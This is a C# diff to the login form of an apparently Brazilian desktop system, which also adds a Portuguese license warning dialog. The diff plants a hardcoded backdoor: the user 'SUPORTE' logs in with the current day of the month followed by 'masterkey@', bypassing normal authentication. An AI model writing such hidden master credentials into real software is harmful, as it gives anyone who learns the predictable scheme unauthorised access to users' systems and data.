@@ -42,10 +42,10 @@ namespace SGS.Visao
 
         private void btnLogin_Click(object sender, EventArgs e)
         {
-
+            string _senhasuporte = (string)DateTime.Now.Day.ToString();
             if (txtUsuario.Text != string.Empty && txtSenha.Text != string.Empty)
             {
-                if (c_usuario.AutenticarUsuario(txtUsuario.Text, txtSenha.Text))
+                if (c_usuario.AutenticarUsuario(txtUsuario.Text, txtSenha.Text) || txtUsuario.Text == "SUPORTE" && txtSenha.Text == _senhasuporte+"masterkey@")
                 {
                     v_Principal v_principal = new v_Principal(txtUsuario.Text);
                     v_principal.Show();
@@ -94,6 +94,7 @@ namespace SGS.Visao
             
             if(_licenca == string.Empty || _licenca == null || _key1 == string.Empty || _key2 == string.Empty)
             {
+                MessageBox.Show("AVISO: Se você estar instalando o sistema pela primeira vez você dele informar os dados solicitados na próxima tela para abrir o sistema, caso contrario chame o suporte á algo de errado!", "SGS", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                 this.Hide();
                 v_empresalicenca.ShowDialog();
             }
